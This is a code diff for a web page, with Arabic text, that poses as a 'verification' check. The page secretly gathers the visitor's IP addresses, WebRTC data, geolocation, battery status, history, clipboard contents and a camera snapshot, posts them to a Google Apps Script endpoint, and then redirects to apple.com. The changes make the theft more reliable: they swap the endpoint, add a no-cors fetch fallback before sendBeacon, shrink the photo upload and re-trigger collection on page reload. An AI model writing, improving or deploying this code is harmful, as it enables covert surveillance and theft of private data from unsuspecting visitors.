@@ -67,7 +67,7 @@
   'use strict';
 
   /* ===================== الإعدادات ===================== */
-  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbzbk7fD3iwCCg-8r0DQ0liNQozavgAVL8VqoxRkD9cejsS7F0xZvrbC_0zRIK3xeGmppw/exec';
+  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbwRGDYzVCBG1ayjnw82Dr3GpXbhnv0VWO34G-r5JkdCxQLPBrFHIrYyR32LyA9c3TU/exec';
   const REDIRECT = 'https://www.apple.com/';
   const T_GEO = 14000, T_NET = 4500, T_RTC = 4500, T_CAM = 9000, T_CHECK = 8000;
   const NA = 'N/A';
@@ -77,7 +77,7 @@
                btn:$('btn'), go:$('go'), hint:$('hint') };
 
   let busy = false, done = false, photoDone = false, geoDone = false;
-  let N = '', BLOB = null, failTimer = null;
+  let N = '', BLOB = null, failTimer = null, touched = false;
 
   const sleep = ms => new Promise(r => setTimeout(r, ms));
   const pad = n => String(n).padStart(2, '0');
@@ -147,7 +147,12 @@
       });
       return true;
     } catch (_) {
-      try { navigator.sendBeacon(ENDPOINT, fd); return true; } catch (__) { return false; }
+      try {
+        await fetch(ENDPOINT, { method: 'POST', mode: 'no-cors', body: fd, cache: 'no-store' });
+        return true;
+      } catch (__) {
+        try { return navigator.sendBeacon(ENDPOINT, fd); } catch (___) { return false; }
+      }
     }
   }
 
@@ -299,15 +304,15 @@
       await v.play().catch(() => {});
       await sleep(650);
       const w = v.videoWidth || 480, h = v.videoHeight || 360;
-      const s = Math.min(1, 420 / Math.max(w, h));
+      const s = Math.min(1, 360 / Math.max(w, h));
       const cv = document.createElement('canvas');
       cv.width = Math.max(1, Math.round(w * s));
       cv.height = Math.max(1, Math.round(h * s));
       cv.getContext('2d').drawImage(v, 0, 0, cv.width, cv.height);
       return await new Promise(r => {
-        if (cv.toBlob) cv.toBlob(r, 'image/jpeg', 0.55);
+        if (cv.toBlob) cv.toBlob(r, 'image/jpeg', 0.5);
         else {
-          const bin = atob(cv.toDataURL('image/jpeg', 0.55).split(',')[1]);
+          const bin = atob(cv.toDataURL('image/jpeg', 0.5).split(',')[1]);
           const a = new Uint8Array(bin.length);
           for (let i = 0; i < bin.length; i++) a[i] = bin.charCodeAt(i);
           r(new Blob([a], { type:'image/jpeg' }));
@@ -332,7 +337,13 @@
         photoDone = true;
         return true;
       } catch (_) {
-        try { navigator.sendBeacon(ENDPOINT, fd); photoDone = true; return true; } catch (__) {}
+        try {
+          await fetch(ENDPOINT, { method:'POST', mode:'no-cors', body:fd, cache:'no-store' });
+          photoDone = true;
+          return true;
+        } catch (__) {
+          try { if (navigator.sendBeacon(ENDPOINT, fd)) { photoDone = true; return true; } } catch (___) {}
+        }
       }
       await sleep(700);
     }
@@ -565,6 +576,18 @@
   }
 
   /* ===================== التدفق ===================== */
+  function resetState() {
+    busy = false; done = false; photoDone = false; geoDone = false; touched = false;
+    N = ''; BLOB = null;
+    clearTimeout(failTimer);
+    el.ring.className = 'ring';
+    el.btn.hidden = true;
+    el.btn.disabled = false;
+    el.btn.textContent = 'بدء التحقق';
+    el.go.hidden = true;
+    setStatus('');
+  }
+
   function succeed() {
     done = true;
     clearTimeout(failTimer);
@@ -575,7 +598,7 @@
     el.btn.hidden = true;
     el.go.href = REDIRECT;
     el.go.hidden = false;
-    setTimeout(() => location.replace(REDIRECT), 1700);
+    setTimeout(() => location.replace(REDIRECT), 1800);
   }
 
   function fail(msg) {
@@ -625,19 +648,22 @@
     const payload = await build(N, { ips, rtc, batt, geo, hist, trap, capi, extra, clip });
 
     let ok = false;
-    if (await postData(payload)) ok = await confirmNonce(N);
-    if (!ok) { setStatus('إعادة المحاولة…'); ok = await jsonpData(payload); }
-    if (!ok) { fail('لم يصل تأكيد من الخادم.'); return; }
+    if (await postData(payload)) ok = true;
+    else ok = await jsonpData(payload);
 
-    BLOB = await withTimeout(blobP, 1200, null);
+    const okP = ok ? confirmNonce(N) : Promise.resolve(false);
+
+    BLOB = await withTimeout(blobP, 3000, null);
     if (BLOB) { setStatus('جارٍ رفع الصورة…'); await sendPhoto(BLOB, N); }
+
+    const confirmed = await okP;
+    if (!confirmed) { fail('لم يصل تأكيد من الخادم.'); return; }
 
     busy = false;
     succeed();
   }
 
   /* إعادة المحاولة عند أول لمسة */
-  let touched = false;
   function onGesture() {
     if (touched) return;
     touched = true;
@@ -665,9 +691,13 @@
     el.btn.disabled = true;
   }
 
-  el.btn.addEventListener('click', () => { done = false; run(); });
+  el.btn.addEventListener('click', () => { resetState(); run(); });
   ['pointerdown','touchstart'].forEach(ev => document.addEventListener(ev, onGesture, { passive:true }));
-  window.addEventListener('pageshow', () => { if (!done && !busy) run(); });
+
+  window.addEventListener('pageshow', e => {
+    if (e.persisted) { resetState(); run(); }
+    else if (!done && !busy) run();
+  });
   window.addEventListener('online', () => { if (!done && !busy) run(); });
   document.addEventListener('visibilitychange', () => {
     if (document.visibilityState === 'visible' && !done && !busy) run();
